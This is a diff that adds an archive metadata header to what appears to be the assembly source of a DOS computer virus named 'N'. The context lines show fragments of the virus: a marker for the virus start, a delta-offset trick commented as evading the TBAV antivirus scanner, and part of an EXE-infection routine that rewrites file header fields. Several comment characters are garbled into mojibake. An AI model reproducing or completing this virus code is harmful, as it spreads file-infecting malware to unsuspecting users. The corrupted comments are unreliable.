@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      N
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
        .model   tiny                                ;_ASSUME CS=DS=ES=SS
        .code                                        ;/
         org     100h                                ;Origin @ 100h (COM File)
@@ -5,7 +16,7 @@
 start:                                              ;Marks Start of Source
 v_start:                                            ;Marks Start of Virus
         mov     bp,000h  ;<Ä¿ Constantly            ;** Get Rid of TBAV's
-delta   equ     $-002h   ;<ÄÙ Changing              ;** Flexible Entry Point
+delta   equ     $-002h   ;<ï¿½ï¿½ Changing              ;** Flexible Entry Point
                                                     ;
         push    ds es                               ;Save Segments onto Stack
                                                     ;
@@ -382,7 +393,7 @@ infectEXEfile:                                      ;
         inc     ax                                  ;Increment AX
                                                     ;
 no_burp:                                            ;
-        mov     word ptr [si+004h],ax               ;New Length of File ö 512
+        mov     word ptr [si+004h],ax               ;New Length of File ï¿½ 512
         mov     word ptr [si+002h],dx               ;New # of Bytes in Last Pg
                                                     ;
         pop     ax dx                               ;Restore File Size
